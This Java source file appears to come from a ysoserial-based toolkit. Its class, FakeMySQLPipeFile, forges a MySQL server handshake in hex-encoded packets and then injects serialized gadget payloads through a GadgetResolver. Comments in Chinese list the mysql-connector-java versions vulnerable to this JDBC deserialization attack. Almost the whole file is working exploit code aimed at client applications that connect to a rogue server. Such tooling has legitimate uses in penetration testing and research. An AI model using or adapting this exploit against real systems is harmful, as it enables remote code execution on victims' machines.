package ysoserial.mysql;


import ysoserial.mysql.proto.GadgetResolver;
import ysoserial.mysql.proto.GreetingMessage;
import ysoserial.mysql.proto.PacketHelper;
import ysoserial.mysql.proto.VariablesResolver;
import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;
import lombok.extern.slf4j.Slf4j;

import java.io.ByteArrayOutputStream;
import java.util.Objects;




public class FakeMySQLPipeFile  {
//            "MysqlVersion",
//            "mysql_jdbc版本，mysql存在漏洞版本(5.1.11-5.1.18,5.1.19-5.1.28,5.1.29,5.1.48,6.0.2-6.0.6),mysql8存在漏洞版本(8.0.7-8.0.20)",
//                   "5.1_mysql5(5.1.11-5.1.18)"
//                   "5_mysql5/mysql6"
//                   "8_mysql8"
    public String MysqlVersion = "5";


    //"msyql连接用户名"
    public String MysqlUsername = "mysql";
    public FakeMySQLPipeFile(String MysqlVersion, String MysqlUsername) {
        this.MysqlVersion = MysqlVersion;
        this.MysqlUsername = MysqlUsername;
    }


    public byte[] getObject(byte[] mysqlData)throws Exception{

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        String a = null;
        //rsp_1 DriverManager.getConnection
        byte[] greet = new GreetingMessage().getBytes();
        byte[] finalPacket = PacketHelper.buildPacket(0, greet);
        outputStream.write(finalPacket);
        outputStream.flush();
        //rsq_2
        if (MysqlVersion.equals("5.1")) {
             a ="360000018fa20200ffffff00210000000000000000000000000000000000000000000000"+ HexBin.encode(MysqlUsername.getBytes())+"00007465737400";
        }else {
             a ="4E0000018FA20A00FFFFFF00210000000000000000000000000000000000000000000000"+ HexBin.encode(MysqlUsername.getBytes())+"000074657374006D7973716C5F6E61746976655F70617373776F726400";
        }

        outputStream.write(Objects.requireNonNull(HexBin.decode(a)));
        outputStream.flush();
        //rsp_2
        outputStream.write(Objects.requireNonNull(HexBin.decode("0700000200000002000000")));
        outputStream.flush();

        if (MysqlVersion.equals("8")) {
            outputStream.write(Objects.requireNonNull(HexBin.decode("65000000032f2a206d7973716c2d636f6e6e6563746f722d6a6176612d382e302e313420285265766973696f6e3a203336353334666132373362346437383234613836363863613638353436356366386561656164643929202a2f53484f57205641524941424c4553")));
            outputStream.flush();
            //rsq_3
            //mysql5

            VariablesResolver resolver = new VariablesResolver(outputStream);
            resolver.resolve();
            outputStream.write(Objects.requireNonNull(HexBin.decode("0f00000003534554204e414d45532075746638")));
            outputStream.flush();

            outputStream.write(Objects.requireNonNull(HexBin.decode("0700000200000002000000")));
            outputStream.flush();
        }

        outputStream.write(Objects.requireNonNull(HexBin.decode("140000000353484F572053455353494F4E20535441545553")));
        outputStream.flush();

        //rsp_3
        GadgetResolver gadgetResolver = new GadgetResolver(outputStream,mysqlData);
        gadgetResolver.resolve();
        outputStream.flush();
        return outputStream.toByteArray();
    }


}
